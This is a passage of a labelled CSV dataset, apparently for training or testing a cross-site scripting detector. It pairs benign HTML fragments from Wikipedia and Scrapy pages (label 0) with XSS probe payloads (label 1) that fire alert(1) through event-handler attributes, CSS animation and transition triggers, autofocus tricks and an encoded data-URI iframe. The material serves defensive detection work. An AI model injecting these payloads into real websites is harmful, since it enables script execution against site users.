,Sentence,Label
8257,"<section draggable=""true"" ondragstart=""alert(1)"">test</section>",1
8258,"<style>:target {transform: rotate(180deg);}</style><bdo id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdo>",1
8259,"<li><img alt=""List-Class article"" src=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/16px-Symbol_list_class.svg.png"" decoding=""async"" title=""List-Class article"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/23px-Symbol_list_class.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/31px-Symbol_list_class.svg.png 2x"" data-file-width=""180"" data-file-height=""185"" /> <b><a href=""/wiki/List_of_emerging_technologies"" title=""List of emerging technologies"">List of emerging technologies </a> </b> </li> </ul>",0
8260,<tbody onpointerenter=alert(1)>XSS</tbody>,1
8261,<svg><datalist onload=alert(1)></datalist>,1
8262,"<ruby onpaste=""alert(1)"" contenteditable>test</ruby>",1
8263,"<li><a href=""/wiki/Carl_Gustav_Hempel"" title=""Carl Gustav Hempel"">Carl Gustav Hempel </a> </li>",0
8264,<table id=x tabindex=1 onactivate=alert(1)></table>,1
8265,"<tr draggable=""true"" ondrag=""alert(1)"">test</tr>",1
8266,"<code onclick=""alert(1)"">test</code>",1
8267,	 </span>,0
8268,	 </ul>,0
8269,"<iframe ondblclick=""alert(1)"">test</iframe>",1
8270,"<caption onclick=""alert(1)"">test</caption>",1
8271, </li>,0
8272,"	 <div id=""Evolutionary_computation"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Evolutionary_computation"" title=""Evolutionary computation"">Evolutionary computation </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Main Topics </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
8273,"<style>@keyframes slidein {}</style><link style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></link>",1
8274,"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",1
8275,	 </span>,0
8276,"<style>@keyframes x{}</style><big style=""animation-name:x"" onanimationstart=""alert(1)""></big>",1
8277,"<noscript onmousemove=""alert(1)"">test</noscript>",1
8278,<svg><b onload=alert(1)></b>,1
8279,"<li><a href=""/wiki/Existential_risk_from_artificial_general_intelligence"" title=""Existential risk from artificial general intelligence"">Existential risk from artificial general intelligence </a> </li>",0
8280,"	<sup id=""cite_ref-138"" class=""reference""><a href=""#cite_note-138"">&#91;135&#93; </a> </sup> Distributed multi-agent coordination of autonomous vehicles remains a difficult problem.",0
8281,"<li><a href=""/wiki/Randomized_algorithm"" title=""Randomized algorithm"">Randomized algorithm </a> </li>",0
8282,<svg><hgroup onload=alert(1)></hgroup>,1
8283,"	 </span>. Morgan Kaufmann. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-1-55860-467-4"" title=""Special:BookSources/978-1-55860-467-4""><bdi>978-1-55860-467-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+A+New+Synthesis&amp;rft.pub=Morgan+Kaufmann&amp;rft.date=1998&amp;rft.isbn=978-1-55860-467-4&amp;rft.aulast=Nilsson&amp;rft.aufirst=Nils&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fartificialintell0000nils&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8284, ,0
8285,	 </span> </h3>,0
8286,document.scripts.length,1
8287,	 </span> ,0
8288,<summary onpointerup=alert(1)>XSS</summary>,1
8289,"<li><a href=""/wiki/Construct_(philosophy)"" title=""Construct (philosophy)"">Construct </a> </li>",0
8290,"<xmp onbeforepaste=""alert(1)"" contenteditable>test</xmp>",1
8291,"<li><a href=""/wiki/Process_control"" title=""Process control"">Process control system </a> </li>",0
8292,"<a onbeforecut=""alert(1)"" contenteditable>test</a>",1
8293,"<plaintext ondblclick=""alert(1)"">test</plaintext>",1
8294,"<fieldset onkeyup=""alert(1)"" contenteditable>test</fieldset>",1
8295,"<div class=""toctree-wrapper compound"">",0
8296,"	 </span> </a> </i>&#93; </sup>. One advantage of neuroevolution is that it may be less prone to get caught in ""dead ends"".<sup id=""cite_ref-245"" class=""reference""><a href=""#cite_note-245"">&#91;234&#93; </a> </sup>",0
8297,<pre onpointerover=alert(1)>XSS</pre>,1
8298,	 </span> ,0
8299," </div>  <div id=""left-navigation"">",0
8300,"<li><a href=""/wiki/Francis_Heylighen"" title=""Francis Heylighen"">Francis Heylighen </a> </li>",0
8301,	 </span>,0
8302,"<summary draggable=""true"" ondrag=""alert(1)"">test</summary>",1
8303,"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",1
8304,	 </span>,0
8305,"<h2>Solving specific problems<a class=""headerlink"" href=""#solving-specific-problems"" title=""Permalink to this headline"">¶</a></h2>",0
8306,<th onpointerover=alert(1)>XSS</th>,1
8307,"<header onkeyup=""alert(1)"" contenteditable>test</header>",1
8308,"<image draggable=""true"" ondrag=""alert(1)"">test</image>",1
8309,"<map onmouseover=""alert(1)"">test</map>",1
8310,"<dt><a class=""reference internal"" href=""topics/contracts.html""><span class=""doc"">Spiders Contracts",0
8311,"<li id=""cite_note-100""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-100"">^ </a> </b> ",0
8312,"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationstart=""alert(1)""></s>",1
8313,"<style oncut=""alert(1)"" contenteditable>test</style>",1
8314,"		<div id=""jump-to-nav""> </div>",0
8315,"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",1
8316,	 </span>,0
8317,"<marquee onmousedown=""alert(1)"">test</marquee>",1
8318,"<svg onpaste=""alert(1)"" contenteditable>test</svg>",1
8319,"	 </span> <span class=""reference-text"">",0
8320,<hr onpointerover=alert(1)>XSS</hr>,1
8321,"<dir ondblclick=""alert(1)"">test</dir>",1
8322,"<mark onbeforecopy=""alert(1)"" contenteditable>test</mark>",1
8323,"<li><a href=""/wiki/Millipede_memory"" title=""Millipede memory"">Millipede </a> </li>",0
8324,"<font draggable=""true"" ondragenter=""alert(1)"">test</font>",1
8325,"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationstart=""alert(1)""></dir>",1
8326,"<h3><span class=""mw-headline"" id=""Perception"">Perception ",0
8327,"<nav onmouseout=""alert(1)"">test</nav>",1
8328,<address id=x tabindex=1 onfocusin=alert(1)></address>,1
8329,"<li><a href=""/wiki/Jacque_Fresco"" title=""Jacque Fresco"">Jacque Fresco </a> </li>",0
8330,<option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>,1
8331,"<multicol onbeforecut=""alert(1)"" contenteditable>test</multicol>",1
8332,"<datalist onmousemove=""alert(1)"">test</datalist>",1
8333,"<time onbeforepaste=""alert(1)"" contenteditable>test</time>",1
8334,"<title onbeforecut=""alert(1)"" contenteditable>test</title>",1
8335, ,0
8336,<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>,1
8337,"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;712–724, </li>",0
8338,"<section onbeforecut=""alert(1)"" contenteditable>test</section>",1
8339,"<div draggable=""true"" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>",1
8340,"<style>@keyframes slidein {}</style><frame style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frame>",1
8341,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=cnet&amp;rft.atitle=Getting+Machines+to+Think+Like+Us&amp;rft.date=2006-07-03&amp;rft.aulast=Skillings&amp;rft.aufirst=Jonathan&amp;rft_id=http%3A%2F%2Fnews.cnet.com%2FGetting-machines-to-think-like-us%2F2008-11394_3-6090207.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8342,<body ontouchstart=alert(1)> ,1
8343,"<style>:target {color: red;}</style><i id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></i>",1
8344,<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>,1
8345,"<html onkeypress=""alert(1)"" contenteditable>test</html>",1
8346,"<center onmousedown=""alert(1)"">test</center>",1
8347, </p>,0
8348,	 </span>,0
8349,"	 </span>  <small class=""date-container""><i>(<span class=""date"">January 2020 ",0
8350,"<a href=""/wiki/DARPA"" title=""DARPA"">DARPA </a> pours money into undirected pure research into AI during the 1960s:",0
8351,"<body onmouseover=""alert(1)"">test</body>",1
8352,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Winograd, Terry (January 1972). ""Understanding natural language"". <i>Cognitive Psychology </i>. <b>3 </b> (1): 1–191. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2F0010-0285%2872%2990002-3"">10.1016/0010-0285(72)90002-3 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Psychology&amp;rft.atitle=Understanding+natural+language&amp;rft.volume=3&amp;rft.issue=1&amp;rft.pages=1-191&amp;rft.date=1972-01&amp;rft_id=info%3Adoi%2F10.1016%2F0010-0285%2872%2990002-3&amp;rft.aulast=Winograd&amp;rft.aufirst=Terry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8353,"<li><a href=""/wiki/Programming_team"" title=""Programming team"">Programming team </a> </li>",0
8354, </li>,0
8355,"<bgsound onpaste=""alert(1)"" contenteditable>test</bgsound>",1
8356,"<bgsound onmousedown=""alert(1)"">test</bgsound>",1
8357,"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",1
8358,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><main id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></main>",1
8359,"<style>@keyframes x{}</style><colgroup style=""animation-name:x"" onanimationend=""alert(1)""></colgroup>",1
8360,"<link rel=""canonical"" href=""https://docs.scrapy.org/en/latest/"" />",0
8361,"<li><cite id=""CITEREFButler1863"" class=""citation news""><a href=""/wiki/Samuel_Butler_(novelist)"" title=""Samuel Butler (novelist)"">Butler, Samuel </a> (13 June 1863). <a rel=""nofollow"" class=""external text"" href=""http://www.nzetc.org/tm/scholarly/tei-ButFir-t1-g1-t1-g1-t4-body.html"">""Darwin among the Machines"" </a>. Letters to the Editor. <i><a href=""/wiki/The_Press"" title=""The Press"">The Press </a> </i>. Christchurch, New Zealand<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">16 October ",0
8362,<multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>,1
8363,<head id=x tabindex=1 onfocusin=alert(1)></head>,1
8364,"<basefont onmouseup=""alert(1)"">test</basefont>",1
8365,"<li><a href=""/wiki/Demarcation_problem"" title=""Demarcation problem"">Demarcation problem </a> </li>",0
8366,<div id=x tabindex=1 onactivate=alert(1)></div>,1
8367,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=report&amp;rft.btitle=Searle%2C+Subsymbolic+Functionalism+and+Synthetic+Intelligence&amp;rft.pages=AI94-222&amp;rft.pub=University+of+Texas+at+Austin&amp;rft.date=1994-06&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.38.8384&amp;rft.aulast=Law&amp;rft.aufirst=Diane&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8368,"<ul><li><a href=""/wiki/Ethics_of_artificial_intelligence"" title=""Ethics of artificial intelligence"">Ethics </a> </li>",0
8369,	 </span> </a> </li>,0
8370,<mark onpointerout=alert(1)>XSS</mark>,1
8371,"<div draggable=""true"" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>",1
8372,	 </span> 2018 ,0
8373,<s id=x tabindex=1 onfocusin=alert(1)></s>,1
8374,<output onpointermove=alert(1)>XSS</output>,1
8375,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></font>",1
8376,"<style onmousemove=""alert(1)"">test</style>",1
8377,"	 </span> <span class=""reference-text""><cite class=""citation web"">Brooks, Rodney (10 November 2014). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20141112130954/http://www.rethinkrobotics.com/artificial-intelligence-tool-threat/"">""artificial intelligence is a tool, not a threat"" </a>. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.rethinkrobotics.com/artificial-intelligence-tool-threat/"">the original </a> on 12 November 2014. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=artificial+intelligence+is+a+tool%2C+not+a+threat&amp;rft.date=2014-11-10&amp;rft.aulast=Brooks&amp;rft.aufirst=Rodney&amp;rft_id=http%3A%2F%2Fwww.rethinkrobotics.com%2Fartificial-intelligence-tool-threat%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8378,"<li id=""cite_note-FOOTNOTEDomingos2015chapter_6-212""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015chapter_6_212-0"">^ </a> </b> ",0
8379,<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,1
8380,"<cite draggable=""true"" ondragend=""alert(1)"">test</cite>",1
8381,          <dd>,0
8382,	 </span> ,0
8383,document.write(sadfsa),1
8384,"<button onpaste=""alert(1)"" contenteditable>test</button>",1
8385,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=41"" title=""Edit section: Law-related professions"">edit </a><span class=""mw-editsection-bracket"">] ",0
8386,"<p draggable=""true"" ondragenter=""alert(1)"">test</p>",1
8387,"<style>:target {color: red;}</style><script id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></script>",1
8388,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
8389,"<th onmouseover=""alert(1)"">test</th>",1
8390,"<li><a href=""/wiki/Interactive_evolutionary_computation"" title=""Interactive evolutionary computation"">Interactive evolutionary computation </a> </li>",0
8391,"<li><a href=""/wiki/Cyberwarfare"" title=""Cyberwarfare"">Cyberwarfare </a> </li>",0
8392,"<li><a href=""/wiki/Hard_problem_of_consciousness"" title=""Hard problem of consciousness"">Hard problem of consciousness </a> </li>",0
8393,	 </span> </h3>,0
8394,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Goertzel, Ben; Lian, Ruiting; Arel, Itamar; de Garis, Hugo; Chen, Shuo (December 2010). ""A world survey of artificial brain projects, Part II: Biologically inspired cognitive architectures"". <i>Neurocomputing </i>. <b>74 </b> (1–3): 30–49. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.neucom.2010.08.012"">10.1016/j.neucom.2010.08.012 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Neurocomputing&amp;rft.atitle=A+world+survey+of+artificial+brain+projects%2C+Part+II%3A+Biologically+inspired+cognitive+architectures&amp;rft.volume=74&amp;rft.issue=1%E2%80%933&amp;rft.pages=30-49&amp;rft.date=2010-12&amp;rft_id=info%3Adoi%2F10.1016%2Fj.neucom.2010.08.012&amp;rft.aulast=Goertzel&amp;rft.aufirst=Ben&amp;rft.au=Lian%2C+Ruiting&amp;rft.au=Arel%2C+Itamar&amp;rft.au=de+Garis%2C+Hugo&amp;rft.au=Chen%2C+Shuo&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8395,<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,1
8396,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
8397,"<dd>""A physical symbol system has the necessary and sufficient means of general intelligent action."" Newell and Simon argue that intelligence consists of formal operations on symbols.<sup id=""cite_ref-Physical_symbol_system_hypothesis_353-0"" class=""reference""><a href=""#cite_note-Physical_symbol_system_hypothesis-353"">&#91;342&#93; </a> </sup> <a href=""/wiki/Hubert_Dreyfus"" title=""Hubert Dreyfus"">Hubert Dreyfus </a> argued that, on the contrary, human expertise depends on unconscious instinct rather than conscious symbol manipulation and on having a ""feel"" for the situation rather than explicit symbolic knowledge. (See <a href=""/wiki/Dreyfus%27_critique_of_AI"" class=""mw-redirect"" title=""Dreyfus&#39; critique of AI"">Dreyfus' critique of AI </a>.)<sup id=""cite_ref-354"" class=""reference""><a href=""#cite_note-354"">&#91;343&#93; </a> </sup><sup id=""cite_ref-Dreyfus&#39;_critique_355-0"" class=""reference""><a href=""#cite_note-Dreyfus&#39;_critique-355"">&#91;344&#93; </a> </sup> </dd> </dl>",0
8398,<shadow onpointermove=alert(1)>XSS</shadow>,1
8399,"<li><a href=""#CITEREFNRC1999"">NRC 1999 </a>, pp.&#160;210–211 </li>",0
8400,<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>,1
8401,"<address onmousedown=""alert(1)"">test</address>",1
8402,"	 </span> <span class=""reference-text""><a href=""#CITEREFNorvig2012"">Norvig 2012 </a>. ",0
8403,"<style>:target {color: red;}</style><menu id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menu>",1
8404,"	 </span> <span class=""reference-text"">P. J. Werbos. Generalization of backpropagation with application to a recurrent gas market model"" <i>Neural Networks </i> 1, 1988. ",0
8405,<ol id=x tabindex=1 onactivate=alert(1)></ol>,1
8406,"<div draggable=""true"" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>",1
8407, </li>,0
8408,"<style>:target {transform: rotate(180deg);}</style><basefont id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></basefont>",1
8409,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/feed-exports.html"">Feed exports</a></li>",0
8410,<footer onpointerleave=alert(1)>XSS</footer>,1
8411,<custom tags onpointerout=alert(1)>XSS</custom tags>,1
8412,"<ul><li><a href=""/wiki/Concurrent_computing"" title=""Concurrent computing"">Concurrent computing </a> </li>",0
8413,"<iframe onpaste=""alert(1)"" contenteditable>test</iframe>",1
8414, ,0
8415,<svg><set onend=alert(1) attributename=x dur=1s>,1
8416,<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>,1
8417,"<li><a href=""/wiki/Electronic_publishing"" title=""Electronic publishing"">Electronic publishing </a> </li>",0
8418,<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>,1
8419,"	 </span> <span class=""reference-text"">",0
8420,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li> </ul>",0
8421,"tYPE=""text/x-scriptlet"" DATA=""http://.rocks/scriptlet.html",1
8422, </p>,0
8423,"<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>",1
8424,"<br onmouseleave=""alert(1)"">test</br>",1
8425, </p>,0
8426, ,0
8427,	 </span>,0
8428,"<audio onmousedown=""alert(1)"">test</audio>",1
8429,<section onpointerout=alert(1)>XSS</section>,1
8430,"<li id=""cite_note-FOOTNOTEDomingos2015-152""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015_152-0"">^ </a> </b> ",0
8431,"            <a href=""//readthedocs.org/projects/scrapy/?fromdocs=scrapy"">Project Home</a>",0
8432,"<li><a href=""/wiki/Logic_programming"" title=""Logic programming"">Logic programming </a> </li>",0
8433,<plaintext onpointerenter=alert(1)>XSS</plaintext>,1
8434,"<li id=""cite_note-Ontology-98""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Ontology_98-0"">^ </a> </b> ",0
8435,"<div draggable=""true"" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>",1
8436,<select onpointermove=alert(1)>XSS</select>,1
8437,"<br draggable=""true"" ondragleave=""alert(1)"">test</br>",1
8438,"<li><a href=""/wiki/Solid_modeling"" title=""Solid modeling"">Solid modeling </a> </li> </ul>",0
8439,"<li><a href=""/wiki/Data_mining"" title=""Data mining"">Data mining </a> </li>",0
8440,"<sup onmousedown=""alert(1)"">test</sup>",1
8441," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Concepts </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
8442,"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",1
8443,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
8444,"<div class=""thumb tright"">",0
8445,"<a href=""/wiki/Neats_vs._scruffies"" class=""mw-redirect"" title=""Neats vs. scruffies"">Neats vs. scruffies </a>:",0
8446,    </nav>,0
8447, </li>,0
8448,<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>,1
8449,"<small onbeforepaste=""alert(1)"" contenteditable>test</small>",1
8450,"<style>:target {color: red;}</style><tfoot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tfoot>",1
8451,<colgroup onpointerenter=alert(1)>XSS</colgroup>,1
8452,<q onpointerleave=alert(1)>XSS</q>,1
8453,"<li><a href=""/wiki/Computational_complexity_theory"" title=""Computational complexity theory"">Computational complexity theory </a> </li>",0
8454,"<li id=""cite_note-vinyals2015-275""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-vinyals2015_275-0"">^ </a> </b> ",0
8455,"<li><a href=""/wiki/Watson_(computer)"" title=""Watson (computer)"">Watson </a><span class=""nowrap"">&#160; ",0
8456,"<hgroup oncontextmenu=""alert(1)"">test</hgroup>",1
8457,	 </span> </li>,0
8458,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=69"" title=""Edit section: In fiction"">edit </a><span class=""mw-editsection-bracket"">] ",0
8459,"<li id=""cite_note-Knowledge_engineering-92""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Knowledge_engineering_92-0"">^ </a> </b> ",0
8460,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
8461,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dialog>",1
8462,"	 </span> <span class=""reference-text""><a href=""#CITEREFDomingos2015"">Domingos 2015 </a>, p.&#160;210. ",0
8463,"<style>:target {transform: rotate(180deg);}</style><script id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></script>",1
8464,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science+%7C+AAAS&amp;rft.atitle=Artificial+intelligence+can+%27evolve%27+to+solve+problems&amp;rft.date=2018-01-10&amp;rft_id=http%3A%2F%2Fwww.sciencemag.org%2Fnews%2F2018%2F01%2Fartificial-intelligence-can-evolve-solve-problems&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8465,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
8466,<samp onpointerenter=alert(1)>XSS</samp>,1
8467,"<a href=""/wiki/Transhumanism"" title=""Transhumanism"">Transhumanism </a>:",0
8468,"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",1
8469,<pre onpointerdown=alert(1)>XSS</pre>,1
8470,"<center onkeypress=""alert(1)"" contenteditable>test</center>",1
8471,<footer onpointerenter=alert(1)>XSS</footer>,1
8472,"<figure onmouseup=""alert(1)"">test</figure>",1
8473,"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>",1
8474,"<bdi draggable=""true"" ondrag=""alert(1)"">test</bdi>",1
8475,<li>Memory,0
8476,"<div role=""navigation"" aria-labelledby=""sister-projects"" class=""metadata plainlinks sistersitebox plainlist mbox-small"" style=""border:1px solid #aaa; padding:0; background:#f9f9f9;"">",0
8477,"<style>@keyframes x{}</style><mark style=""animation-name:x"" onanimationstart=""alert(1)""></mark>",1
8478,<hr id=x tabindex=1 onbeforedeactivate=alert(1)></hr><input autofocus>,1
8479,"<li><a href=""/wiki/Center_for_Applied_Rationality"" title=""Center for Applied Rationality"">Center for Applied Rationality </a> </li>",0
8480,	 </span> </h2>,0
8481,"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;~46–52 </li>",0
8482,	 </span> </a> </li>,0
8483,"<hr onbeforecopy=""alert(1)"" contenteditable>test</hr>",1
8484,"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Applications_of_artificial_intelligence"" title=""Applications of artificial intelligence"">Applications of artificial intelligence </a> </div>",0
8485,              </div>          ,0
8486,"<area onclick=""alert(1)"">test</area>",1
